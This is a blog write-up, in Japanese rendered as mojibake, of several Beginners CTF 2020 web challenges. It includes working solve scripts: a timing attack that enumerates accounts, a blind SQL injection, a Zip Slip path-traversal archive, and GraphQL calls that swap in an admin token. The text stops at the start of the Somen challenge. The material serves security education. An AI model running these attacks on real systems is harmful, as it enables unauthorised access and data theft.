---
layout: post
title: Beginners CTF 2020 ã® write-up
categories: [ctf]
date: 2020-05-24 14:00:00 +0900
---

5 æœˆ 23 æ—¥ã‹ã‚‰ 5 æœˆ 24 æ—¥ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ [Bginners CTF 2020](https://score.beginners.seccon.jp/) ã«ã€ã²ã¨ã‚Šãƒãƒ¼ãƒ [åºƒ](https://www.hai-furi.com/character/04_06/)[ç”°](https://www.youtube.com/watch?v=W_0uEv94CpU)[ç©º](https://harekaze.com/)ã¨ã—ã¦å‚åŠ ã—ã¾ã—ãŸã€‚æœ€çµ‚çš„ã« 4233 ç‚¹ã‚’ç²å¾—ã—ã€é †ä½ã¯ 50 ç‚¹ä»¥ä¸Šå¾—ç‚¹ã—ãŸ 1009 ãƒãƒ¼ãƒ ä¸­ 10 ä½ã§ã—ãŸã€‚

ä»¥ä¸‹ã€ç§ãŒè§£ã„ãŸå•é¡Œã® write-up (Pwn é™¤ã) ã§ã™ã€‚

## [Web 55] Spy (441 solves)
> As a spy, you are spying on the "ctf4b company".
> 
> You got the name-list of employees and the URL to the in-house web tool used by some of them.
> 
> Your task is to enumerate the employees who use this tool in order to make it available for social engineering.
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: 
> - app.py
> - employees.txt

`app.py` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```python
import os
import time

from flask import Flask, render_template, request, session

# Database and Authentication libraries (you can't see this :p).
import db
import auth

# ====================

app = Flask(__name__)
app.SALT = os.getenv("CTF4B_SALT")
app.FLAG = os.getenv("CTF4B_FLAG")
app.SECRET_KEY = os.getenv("CTF4B_SECRET_KEY")

db.init()
employees = db.get_all_employees()

# ====================

@app.route("/", methods=["GET", "POST"])
def index():
    t = time.perf_counter()

    if request.method == "GET":
        return render_template("index.html", message="Please login.", sec="{:.7f}".format(time.perf_counter()-t))
    
    if request.method == "POST":
        name = request.form["name"]
        password = request.form["password"]

        exists, account = db.get_account(name)

        if not exists:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))

        # auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.
        # You know, it's really secure... isn't it? :-)
        hashed_password = auth.calc_password_hash(app.SALT, password)
        if hashed_password != account.password:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))

        session["name"] = name
        return render_template("dashboard.html", sec="{:.7f}".format(time.perf_counter()-t))

# ====================

@app.route("/challenge", methods=["GET", "POST"])
def challenge():
    t = time.perf_counter()
    
    if request.method == "GET":
        return render_template("challenge.html", employees=employees, sec="{:.7f}".format(time.perf_counter()-t))

    if request.method == "POST":
        answer = request.form.getlist("answer")

        # If you can enumerate all accounts, I'll give you FLAG!
        if set(answer) == set(account.name for account in db.get_all_accounts()):
            message = app.FLAG
        else:
            message = "Wrong!!"
        
        return render_template("challenge.html", message=message, employees=employees, sec="{:.7f}".format(time.perf_counter()-t))

# ====================

if __name__ == '__main__':
    db.init()
    app.run(host=os.getenv("CTF4B_HOST"), port=os.getenv("CTF4B_PORT"))
```

é‡è¦ãã†ãªã¨ã“ã‚ã‚’æŠœãå‡ºã—ã¦ã¿ã¾ã™ã€‚

```python
@app.route("/", methods=["GET", "POST"])
def index():
    ï¸™
    if request.method == "POST":
        name = request.form["name"]
        password = request.form["password"]

        exists, account = db.get_account(name)

        if not exists:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))

        # auth.calc_password_hash(salt, password) adds salt and performs stretching so many times.
        # You know, it's really secure... isn't it? :-)
        hashed_password = auth.calc_password_hash(app.SALT, password)
        if hashed_password != account.password:
            return render_template("index.html", message="Login failed, try again.", sec="{:.7f}".format(time.perf_counter()-t))
```

ãƒ•ã‚©ãƒ¼ãƒ ã‹ã‚‰å…¥åŠ›ã—ãŸãƒ¦ãƒ¼ã‚¶åãŒå­˜åœ¨ã—ã¦ã„ã‚‹å ´åˆã«é™ã‚Šã€æ¿€é‡ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒã‚§ãƒƒã‚¯å‡¦ç†ã‚’è¡Œã†ã‚ˆã†ã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãŒå­˜åœ¨ã—ãªã‘ã‚Œã°ã“ã®æ¿€é‡ãªå‡¦ç†ã¯è¡Œã‚ã‚Œã¾ã›ã‚“ã‹ã‚‰ã€(`time.perf_counter()-t` ã«ã‚ˆã£ã¦è¨ˆç®—ã•ã‚Œã¦ã„ã‚‹) ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‹ã‹ã£ãŸæ™‚é–“ã‚’è¦‹ã‚‹ã ã‘ã§ã€ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãŒå­˜åœ¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ãŒç¢ºèªã§ããã†ã§ã™ã€‚ã§ã‚‚ã€çŸ¥ã£ã¦å¬‰ã—ã„ã“ã¨ã¯ã‚ã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚

```python
@app.route("/challenge", methods=["GET", "POST"])
def challenge():
ï¸™
    if request.method == "POST":
        answer = request.form.getlist("answer")

        # If you can enumerate all accounts, I'll give you FLAG!
        if set(answer) == set(account.name for account in db.get_all_accounts()):
            message = app.FLAG
```

å­˜åœ¨ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶åã®å…¨ã¦ã‚’ç­”ãˆã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒã‚‚ã‚‰ãˆã‚‹ãƒšãƒ¼ã‚¸ãŒã‚ã‚‹ã‚ˆã†ã§ã™ã€‚ãªã‚‹ã»ã©ã€ã“ã‚Œãªã‚‰å­˜åœ¨ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ã®ä¸€è¦§ã‚’çŸ¥ã‚‹æ„å‘³ãŒã‚ã‚Šãã†ã§ã™ã€‚ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¨ä¸€ç·’ã«ä¸ãˆã‚‰ã‚ŒãŸ `employees.txt` ã¯ã“ã®ä¼šç¤¾ã®ç¤¾å“¡ã®åå‰ã®ã‚ˆã†ã§ã™ã‹ã‚‰ã€ã“ã‚Œã‚’å…ƒã«ã©ã®ç¤¾å“¡ãŒã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ã‹ãƒã‚§ãƒƒã‚¯ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```python
import requests
import time

THRESHOLD = 0.3
URL = 'https://(çœç•¥)/'

with open('employees.txt') as f:
  employees = [line.strip() for line in f.readlines()]

for employee in employees:
  t = time.time()
  requests.post(URL, data={'name': employee, 'password': 'neko'})
  if time.time() - t > THRESHOLD:
    print(employee)
```

```
$ python3 solve.py
Elbert
George
Lazarus
Marc
Tony
Ximena
Yvonne
```

ã“ã® 7 äººãŒã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚`/challenge` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹å…¨ã¦ã®ç¤¾å“¡ã«ãƒã‚§ãƒƒã‚¯ã‚’å…¥ã‚Œã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

![ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒã£ã¦ã„ã‚‹ç¤¾å“¡ã‚’å…¨ã¦ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚ŒãŸ](../images/2020-05-24_spy.png)

```
ctf4b{4cc0un7_3num3r4710n_by_51d3_ch4nn3l_4774ck}
```

## [Web 150] Tweetstore (150 solves)
> Search your flag!
> 
> Server: https://(çœç•¥)/
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: webserver.go

ä»¥ä¸‹ã®ã‚ˆã†ãª Go ã‚³ãƒ¼ãƒ‰ãŒä¸ãˆã‚‰ã‚Œã¾ã—ãŸã€‚

```go
package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"
	
	"database/sql"
	"html/template"
	"net/http"

	"github.com/gorilla/handlers"
	"github.com/gorilla/mux"

	_"github.com/lib/pq"
)

var tmplPath = "./templates/"

var db *sql.DB

type Tweets struct {
	Url        string
	Text       string
	Tweeted_at time.Time
}

func handler_index(w http.ResponseWriter, r *http.Request) {

	tmpl, err := template.ParseFiles(tmplPath + "index.html")
	if err != nil {
		log.Fatal(err)
	}

	var sql = "select url, text, tweeted_at from tweets"

	search, ok := r.URL.Query()["search"]
	if ok {
		sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
	}

	sql += " order by tweeted_at desc"

	limit, ok := r.URL.Query()["limit"]
	if ok && (limit[0] != "") {
		sql += " limit " + strings.Split(limit[0], ";")[0]
	}

	var data []Tweets


	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	rows, err := db.QueryContext(ctx, sql)
	if err != nil{
		log.Fatal(err)
	}

	for rows.Next() {
		var text string
		var url string
		var tweeted_at time.Time

		err := rows.Scan(&url, &text, &tweeted_at)
		if err != nil {
			log.Fatal(err)
		}
		data = append(data, Tweets{url, text, tweeted_at})
	}

	tmpl.Execute(w, data)
}

func initialize() {
	var err error

	dbname := "ctf"
	dbuser := os.Getenv("FLAG")
	dbpass := "password"

	connInfo := fmt.Sprintf("port=%d host=%s user=%s password=%s dbname=%s sslmode=disable", 5432, "db", dbuser, dbpass, dbname)
	db, err = sql.Open("postgres", connInfo)
	if err != nil {
		log.Fatal(err)
	}
}

func main() {

	var err error

	initialize()
	logFile, err := os.OpenFile("/log/access_log", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0640)
	if err != nil {
		log.Fatal(err)
	}

	r := mux.NewRouter()
	r.HandleFunc("/", handler_index).Methods("GET")

	http.Handle("/", r)
	http.ListenAndServe(":8080", handlers.LoggingHandler(logFile, http.DefaultServeMux))
}
```

ã¾ãšã¯ãƒ•ãƒ©ã‚°ã®å ´æ‰€ã‚’ç¢ºèªã—ã¾ã—ã‚‡ã†ã€‚

```go
func initialize() {
	var err error

	dbname := "ctf"
	dbuser := os.Getenv("FLAG")
	dbpass := "password"

	connInfo := fmt.Sprintf("port=%d host=%s user=%s password=%s dbname=%s sslmode=disable", 5432, "db", dbuser, dbpass, dbname)
	db, err = sql.Open("postgres", connInfo)
	if err != nil {
		log.Fatal(err)
	}
}
```

ãƒ¦ãƒ¼ã‚¶åãŒãƒ•ãƒ©ã‚°ã®ã‚ˆã†ã§ã™ã€‚`sql.Open("postgres", connInfo)` ã‹ã‚‰ PostgreSQL ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ã“ã¨ã‚‚ã‚ã‹ã‚Šã¾ã™ã€‚

è„†å¼±æ€§ãŒãªã„ã‹æ¢ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```go
func handler_index(w http.ResponseWriter, r *http.Request) {
ï¸™
	var sql = "select url, text, tweeted_at from tweets"

	search, ok := r.URL.Query()["search"]
	if ok {
		sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
	}

	sql += " order by tweeted_at desc"

	limit, ok := r.URL.Query()["limit"]
	if ok && (limit[0] != "") {
		sql += " limit " + strings.Split(limit[0], ";")[0]
	}
ï¸™
	rows, err := db.QueryContext(ctx, sql)
	if err != nil{
		log.Fatal(err)
	}
ï¸™
}
```

`limit` å¥ã« `'` ã‚’ç½®æ›ã™ã‚‹ã‚ˆã†ãªå‡¦ç†ãŒãªã•ã‚Œãªã„ã¾ã¾ãƒ¦ãƒ¼ã‚¶å…¥åŠ›ãŒæŒ¿å…¥ã•ã‚Œã¦ã„ã¾ã™ã€‚PostgreSQL ã§ã¯ `limit` å¥ã§ã‚µãƒ–ã‚¯ã‚¨ãƒªã‚’åˆ©ç”¨ã§ãã¾ã™ã‹ã‚‰ã€ã“ã“ã§ `(CASE WHEN x > 123 THEN 1 ELSE 0 END)` ã®ã‚ˆã†ã«ã‚ã‚‹æ¡ä»¶ã«å½“ã¦ã¯ã¾ã‚‹å ´åˆã«ã¯ `1` ã‚’ã€ãã†ã§ãªã„å ´åˆã«ã¯ `0` ã‚’è¿”ã™ã‚ˆã†ãªå‡¦ç†ã‚’ã•ã›ã‚Œã°ã€è¿”ã£ã¦ããŸãƒ¬ã‚³ãƒ¼ãƒ‰ã®ä»¶æ•°ã‚’è¦‹ã‚‹ã ã‘ã§ãã®æ¡ä»¶ã®çœŸå½ãŒã‚ã‹ã‚Šã¾ã™ã€‚Blind SQLi ãƒãƒ£ãƒ³ã‚¹ã§ã™ã€‚

PostgreSQL ã§ã¯ `SELECT user` ã§ãƒ¦ãƒ¼ã‚¶åãŒå–å¾—ã§ãã‚‹ã“ã¨ã‚’åˆ©ç”¨ã—ã¦ã€1 ãƒ“ãƒƒãƒˆãšã¤æƒ…å ±ã‚’å–ã‚Šå‡ºã—ã¦ã„ãã¾ã—ã‚‡ã†ã€‚

```python
import requests
URL = 'https://(çœç•¥)/?search=1&limit='
BASE = '(select%20ascii(substr(user,{},1))%26{})'

res = ''
i = 1
while True:
  c = 0

  for j in range(7):
    req = requests.get(URL + BASE.format(i, 1 << j))
    if 'Watch@Twitter' in req.text:
      c |= 1 << j

  res += chr(c)
  print(res)
  i += 1
```

```
$ python3 solve.py
ï¸™
ctf4b{is_postgres_your_friend
ctf4b{is_postgres_your_friend?
ctf4b{is_postgres_your_friend?}
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{is_postgres_your_friend?}
```

## [Web 188] unzip (118 solves)
> Unzip Your .zip Archive Like a Pro.
> 
> https://(çœç•¥)/
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: index.php

ä»¥ä¸‹ã®ã‚ˆã†ãª PHP ã‚³ãƒ¼ãƒ‰ãŒä¸ãˆã‚‰ã‚Œã¾ã—ãŸã€‚

```php
<?php
error_reporting(0);
session_start();

// prepare the session
$user_dir = "/uploads/" . session_id();
if (!file_exists($user_dir))
    mkdir($user_dir);

if (!isset($_SESSION["files"]))
    $_SESSION["files"] = array();

// return file if filename parameter is passed
if (isset($_GET["filename"]) && is_string(($_GET["filename"]))) {
    if (in_array($_GET["filename"], $_SESSION["files"], TRUE)) {
        $filepath = $user_dir . "/" . $_GET["filename"];
        header("Content-Type: text/plain");
        echo file_get_contents($filepath);
        die();
    } else {
        echo "no such file";
        die();
    }
}

// process uploaded files
$target_file = $target_dir . basename($_FILES["file"]["name"]);
if (isset($_FILES["file"])) {
    // size check of uploaded file
    if ($_FILES["file"]["size"] > 1000) {
        echo "the size of uploaded file exceeds 1000 bytes.";
        die();
    }

    // try to open uploaded file as zip
    $zip = new ZipArchive;
    if ($zip->open($_FILES["file"]["tmp_name"]) !== TRUE) {
        echo "failed to open your zip.";
        die();
    }


    // check the size of unzipped files
    $extracted_zip_size = 0;
    for ($i = 0; $i < $zip->numFiles; $i++)
        $extracted_zip_size += $zip->statIndex($i)["size"];

    if ($extracted_zip_size > 1000) {
        echo "the total size of extracted files exceeds 1000 bytes.";
        die();
    }

    // extract
    $zip->extractTo($user_dir);

    // add files to $_SESSION["files"]
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $s = $zip->statIndex($i);
        if (!in_array($s["name"], $_SESSION["files"], TRUE)) {
            $_SESSION["files"][] = $s["name"];
        }
    }

    $zip->close();
}
?>

<!DOCTYPE html>
<html>

<head>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title></title>
</head>

<body>
    <nav role="navigation">
        <div class="nav-wrapper container">
            <a id="logo-container" href="/" class="brand-logo">Unzip</a>
        </div>
    </nav>


    <div class="container">
        <br><br>
        <h1 class="header center teal-text text-lighten-2">Unzip</h1>
        <div class="row center">
            <h5 class="header col s12 light">
                Unzip Your .zip Archive Like a Pro
            </h5>
        </div>
    </div>
    </div>



    <div class="container">
        <div class="section">
            <h2>Upload</h2>
            <form method="post" enctype="multipart/form-data">
                <div class="file-field input-field">
                    <div class="btn">
                        <span>Select .zip to Upload</span>
                        <input type="file" name="file">
                    </div>
                    <div class="file-path-wrapper">
                        <input class="file-path validate" type="text">
                    </div>
                </div>
                <button class="btn waves-effect waves-light">
                    Submit
                    <i class="material-icons right">send</i>
                </button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="section">
            <h2>Files from Your Archive(s)</h2>
            <div class="collection">
                <?php foreach ($_SESSION["files"] as $filename) { ?>
                    <a href="/?filename=<?= urlencode($filename) ?>" class="collection-item"><?= htmlspecialchars($filename, ENT_QUOTES, "UTF-8") ?></a>
                <? } ?>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
</body>

</html>
```

ZIP ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¸ãˆã‚‹ã¨ `/uploads/(ã‚»ãƒƒã‚·ãƒ§ãƒ³ ID)` ã«å±•é–‹ã—ã¦ãã‚Œã‚‹ Web ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚ˆã†ã§ã™ã€‚

å±•é–‹å¾Œã¯ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒ‡ãƒ¼ã‚¿ã¨ã—ã¦ `$_SESSION["files"]` ã«ãƒ•ã‚¡ã‚¤ãƒ«åã‚’æ ¼ç´ã—ã¦ã„ã¾ã™ã€‚`index.php?filename=(ãƒ•ã‚¡ã‚¤ãƒ«å)` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸéš›ã«ã€`$_SESSION["files"]` ã«ãã®ãƒ•ã‚¡ã‚¤ãƒ«åãŒã‚ã‚Œã°ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å‡ºã—ã¦å‡ºåŠ›ã™ã‚‹ã‚ˆã†ã§ã™ã€‚

ZIP ãƒ•ã‚¡ã‚¤ãƒ«ã« `../../../../../etc/passwd` ã®ã‚ˆã†ãªåå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã£ãŸå ´åˆã«ã¯ã©ã†ãªã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚ã„ã‚ã‚†ã‚‹ [Zip Slip](https://github.com/snyk/zip-slip-vulnerability) ã®ã‚ˆã†ãªã“ã¨ã«ãªã‚‹ã¨å¬‰ã—ã„ã®ã§ã™ãŒã€‚ã¨ã‚Šã‚ãˆãšè©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` ã®ã‚ˆã†ãªåå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ ZIP ã«æ ¼ç´ã—ã€ãƒã‚¤ãƒŠãƒªã‚¨ãƒ‡ã‚£ã‚¿ã§ ZIP ãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ã„ã¦ãƒ•ã‚¡ã‚¤ãƒ«åã®éƒ¨åˆ†ã‚’ `/../../../../../../../flag.txt` ã«ç½®ãæ›ãˆã¾ã™ã€‚

```
$ xxd payload.zip
0000000: 504b 0304 1400 0000 0000 567a b750 0000  PK........Vz.P..
0000010: 0000 0000 0000 0000 0000 2000 0000 2e2e  .......... .....
0000020: 2f2e 2e2f 2e2e 2f2e 2e2f 2e2e 2f2e 2e2f  /../../../../../
0000030: 2e2e 2f2e 2e2f 666c 6167 2e74 7874 504b  ../../flag.txtPK
0000040: 0102 1400 1400 0000 0000 567a b750 0000  ..........Vz.P..
0000050: 0000 0000 0000 0000 0000 2000 0000 0000  .......... .....
0000060: 0000 0000 0000 b681 0000 0000 2e2e 2f2e  ............../.
0000070: 2e2f 2e2e 2f2e 2e2f 2e2e 2f2e 2e2f 2e2e  ./../../../../..
0000080: 2f2e 2e2f 666c 6167 2e74 7874 504b 0506  /../flag.txtPK..
0000090: 0000 0000 0100 0100 4e00 0000 3e00 0000  ........N...>...
00000a0: 0000
```

ã“ã†ã—ã¦ã§ããŸ `payload.zip` ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€`/?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag.txt` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{y0u_c4nn07_7ru57_4ny_1npu75_1nclud1n6_z1p_f1l3n4m35}
```

## [Web 301] profiler (59 solves)
> Let's edit your profile with profiler!
> 
> Hint: You don't need to deobfuscate *.js

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãƒ¦ãƒ¼ã‚¶ã®ç™»éŒ²ãƒ•ã‚©ãƒ¼ãƒ ã¨ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

![profilerã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ](../images/2020-05-24_profiler_login.png)

é©å½“ãªãƒ¦ãƒ¼ã‚¶åã§ç™»éŒ²ã—ã¦ã¿ã‚‹ã¨ã€è¬ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒç™ºè¡Œã•ã‚Œã¾ã—ãŸã€‚

![ãƒ¦ãƒ¼ã‚¶ç™»éŒ²ã™ã‚‹ã¨ãƒˆãƒ¼ã‚¯ãƒ³ãŒç™ºè¡Œã•ã‚ŒãŸ](../images/2020-05-24_profiler_token.png)

ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã¨ (XSS ã¯ã§ããªã„ã‘ã©) å¥½ããªå†…å®¹ã«å¤‰æ›´ã§ãã‚‹ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ãƒšãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

![ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã¨ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ãƒšãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚ŒãŸ](../images/2020-05-24_profiler_profile.png)

`Get FLAG` ã¨ã„ã†ãƒœã‚¿ãƒ³ã‚’æŠ¼ã›ã°ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œãã†ã«æ€ãˆã¾ã™ãŒã€ãã†ç°¡å˜ã«ã¯ã„ãã¾ã›ã‚“ã€‚`Sorry, your token is not administrator's one. This page is only for administrator(uid: admin).` ã¨æ€’ã‚‰ã‚Œã¦ã—ã¾ã„ã¾ã—ãŸã€‚ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒã€UID ãŒ `admin` ã§ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¨åŒã˜ã§ãªã„ã¨è¡¨ç¤ºã—ã¦ãã‚Œãªã„ã‚ˆã†ã§ã™ã€‚

Google Chrome ã® DevTools ã‚’é–‹ã„ã¦ Network ã‚¿ãƒ–ã‚’çœºã‚ã¦ã„ã‚‹ã¨ã€`/api` ã«ä»¥ä¸‹ã®ã‚ˆã†ãª JSON ã‚’ POST ã—ã¦ã„ã‚‹æ§˜å­ãŒç¢ºèªã§ãã¾ã—ãŸã€‚

```json
{"query":"query {\n    flag\n  }"}
```

GraphQL ã‚’ä½¿ã£ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚[prisma-labs/get-graphql-schema](https://github.com/prisma-labs/get-graphql-schema) ã§ GraphQL ã‚¹ã‚­ãƒ¼ãƒã‚’å–å¾—ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ get-graphql-schema https://(çœç•¥)/api
type Mutation {
  updateProfile(profile: String!, token: String!): Boolean!
  updateToken(token: String!): Boolean!
}

type Query {
  me: User!
  someone(uid: ID!): User
  flag: String!
}

type User {
  uid: ID!
  name: String!
  profile: String!
  token: String!
}
```

`updateProfile` ã¨ `updateToken` ã¨ã„ã†ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãŒå­˜åœ¨ã—ã¦ã„ã¾ã™ã€‚å‰è€…ã¯ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’æ›´æ–°ã™ã‚‹ã®ã«ä½¿ã‚ã‚Œã‚‹ã®ã§ã—ã‚‡ã†ãŒã€å¾Œè€…ã¯ãªã‚“ã§ã—ã‚‡ã†ã‹ã€‚åå‰ã‹ã‚‰æ¨æ¸¬ã™ã‚‹ã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŒ‡å®šã—ãŸã‚‚ã®ã«æ›´æ–°ã§ãã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚

ã¾ãŸã€ã‚¯ã‚¨ãƒªã§ã¯ `someone(uid: "user")` ã®ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ `user` ã¨ã„ã† UID ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ã®æƒ…å ±ã‚’å…¥æ‰‹ã§ããã†ã§ã™ã€‚ã“ã‚Œã§ `admin` ã®æƒ…å ±ã‚’å–å¾—ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ curl 'https://(çœç•¥)/api' \
>   -H 'content-type: application/json' \
>   -H 'Cookie: session=(çœç•¥)' \
>   --data-binary '{"query":"query {\n    someone(uid: '"\\\"admin\\\""') {\n      uid\n      name\n      profile\n      token\n    }\n  }"}'
{"data":{"someone":{"name":"admin","profile":"Hello, I'm admin.","token":"743fb96c5d6b65df30c25cefdab6758d7e1291a80434e0cdbb157363e1216a5b","uid":"admin"}}}
```

`admin` ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒ `743fb96c5d6b65df30c25cefdab6758d7e1291a80434e0cdbb157363e1216a5b` ã§ã‚ã‚‹ã¨ã‚ã‹ã‚Šã¾ã—ãŸã€‚

å…ˆç¨‹å¾—ã‚‰ã‚ŒãŸ `updateToken` ã¨ã„ã†ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ã£ã¦ä»Šãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã“ã‚Œã«å¤‰ãˆã‚‰ã‚Œãªã„ã§ã—ã‚‡ã†ã‹ã€‚ã‚„ã£ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ curl 'https://(çœç•¥)/api' \
>   -H 'content-type: application/json' \
>   -H 'Cookie: session=(çœç•¥)' \
>   --data-binary $'{"query":"mutation {\\n    updateToken(token: \\"743fb96c5d6b65df30c25cefdab6758d7e1291a80434e0cdbb157363e1216a5b\\")\\n  }"}'
{"data":{"updateToken":true}}
```

ã§ããŸã‚ˆã†ã§ã™ã€‚ã“ã®ã¾ã¾ `/flag` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{plz_d0_n07_4cc3p7_1n7r05p3c710n_qu3ry}
```

## [Web 421] Somen (20 solves)
> Somen is tasty.
> 
> - https://(çœç•¥)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«:
> - worker.js
> - index.php

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ç°¡ç´ ãªãƒ‡ã‚¶ã‚¤ãƒ³ã® Web ãƒšãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚[æ˜¨å¹´ã®ãƒ©ãƒ¼ãƒ¡ãƒ³](2019-05-26-beginners-ctf.html#warmup-ramen-73)ã¨ã„ã„ã“ã®å•é¡Œã¨ã„ã„ã€éººé¡ãŒå¥½ããªã®ã§ã—ã‚‡ã†ã‹ã€‚ç§ã‚‚å¥½ãã§ã™ã€‚

![Best somen for You](../images/2020-05-24_somen.png)

åå‰ã®å…¥åŠ›ã‚’æ±‚ã‚ã‚‰ã‚Œã¦ã„ã‚‹ã‚ˆã†ãªã®ã§ã€æ›¸ã„ã¦é€ã£ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

![æµã—ãã†ã‚ã‚“ã‚’å‹§ã‚ã‚‰ã‚ŒãŸ](../images/2020-05-24_somen_nagashi.png)

æµã—ãã†ã‚ã‚“ã‚’å‹§ã‚ã‚‰ã‚Œã¾ã—ãŸã€‚

